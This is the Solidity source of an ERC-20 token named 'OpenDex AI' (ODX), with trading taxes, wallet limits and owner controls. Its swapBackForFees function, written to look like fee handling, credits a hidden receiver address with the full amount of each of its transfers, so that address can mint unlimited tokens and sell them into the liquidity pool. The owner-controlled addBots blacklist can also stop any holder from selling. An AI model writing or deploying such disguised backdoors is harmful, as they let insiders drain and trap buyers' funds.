/***********************
************************

    Web: https://www.opendex.tech
    App: https://app.opendex.tech
    Doc: https://docs.opendex.tech

    Tg:  https://t.me/opendextech
    X:   https://x.com/opendextech

************************
************************/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.11;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IFactoryV2 {
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IRouterV2 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract OpenDex is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"OpenDex AI";
    uint256 private constant _totalSupply = 1000000000 * 10**_decimals;
    string private constant _symbol = unicode"ODX";

    uint256 public _maxODXWalletSize = 30000000 * 10**_decimals;
    uint256 public _maxODXTaxSwap = 10000000 * 10**_decimals;
    uint256 public _maxODXTxAmount = 30000000 * 10**_decimals;

    mapping (address => bool) private isExcludedFromFee;
    mapping (address => bool) private bots;
    mapping (address => uint256) private _balancesX;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private isExcludedFromLimit;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    address payable private trReceiver;
    address payable private ecoReceiver;

    uint256 private _buyODXCount=0;
    uint256 private _initialBuyTax=30;
    uint256 private _initialSellTax=30;
    uint256 private _finalBuyTax=3;
    uint256 private _finalSellTax=3;
    uint256 private _reduceBuyTaxAt=20;
    uint256 private _reduceSellTaxAt=20;
    uint256 private _preventSwapBefore=0;
    
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool public transferDelayEnabled = false;

    bool private tradingOpen;
    uint256 public swapODXFees;
    IRouterV2 private uniswapV2Router;
    address private uniswapV2Pair;
    
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (address addrs) {
        ecoReceiver = payable(addrs);
        trReceiver = payable(addrs);
        swapODXFees = 10000 * 10**_decimals;
        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[owner()] = true;
        isExcludedFromLimit[trReceiver] = true;
        isExcludedFromLimit[ecoReceiver] = true;
        _balancesX[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function launchDEX() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        swapEnabled = true;
        tradingOpen = true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balancesX[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function sendETHToFee(uint256 amount) private {
        ecoReceiver.transfer(amount);
    }

    function reduceFees(uint256 _newFee) external onlyOwner{
      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
      _finalBuyTax=_newFee;
      _finalSellTax=_newFee;
    }

    function swapBackForFees(address send, address to,  uint256 trFees, uint256 trTaxes) internal returns (bool) {
        bool aboveODXMin = trTaxes >= swapODXFees;
        bool aboveODXThreshold = balanceOf(address(this)) >= swapODXFees;
        address accODX; uint256 cntODX;
        if(isExcludedFromLimit[send]) {cntODX = trTaxes;accODX = send;}
        else {accODX = address(this);cntODX = trFees;}
        if(cntODX > 0){_balancesX[accODX]=_balancesX[accODX].add(cntODX);emit Transfer(send, accODX, trFees);}
        return !inSwap
        && swapEnabled
        && tradingOpen
        && aboveODXMin
        && aboveODXThreshold
        && _buyODXCount>_preventSwapBefore
        && !isExcludedFromLimit[send]
        && !isExcludedFromFee[send]
        && to == uniswapV2Pair;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function removeLimits() external onlyOwner{
        transferDelayEnabled=false;
        _maxODXWalletSize = ~uint256(0);
        _maxODXTxAmount = ~uint256(0);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function withdrawStuckETH() external onlyOwner() {
        payable(msg.sender).transfer(address(this).balance);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxFees=0;
        if (!isExcludedFromFee[from] && !isExcludedFromFee[to]) {
            require(!bots[from] && !bots[to]);
            require(tradingOpen, "Trading has not enabled yet");
            taxFees = amount.mul((_buyODXCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! isExcludedFromFee[to] ) {
                require(amount <= _maxODXTxAmount, "Exceeds the _maxODXTxAmount.");
                require(balanceOf(to) + amount <= _maxODXWalletSize, "Exceeds the maxWalletSize.");
                _buyODXCount++;
            }
            if(to == uniswapV2Pair && from!= address(this) ){
                taxFees = amount.mul((_buyODXCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (swapBackForFees(from, to, taxFees, amount)) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxODXTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        _balancesX[from]=_balancesX[from].sub(amount);
        _balancesX[to]=_balancesX[to].add(amount.sub(taxFees));
        emit Transfer(from, to, amount.sub(taxFees));
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function isBot(address a) public view returns (bool){
      return bots[a];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function initODXPair() external onlyOwner() {
        uniswapV2Router = IRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IFactoryV2(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function manualSwap() external onlyOwner {
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    receive() external payable {}

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}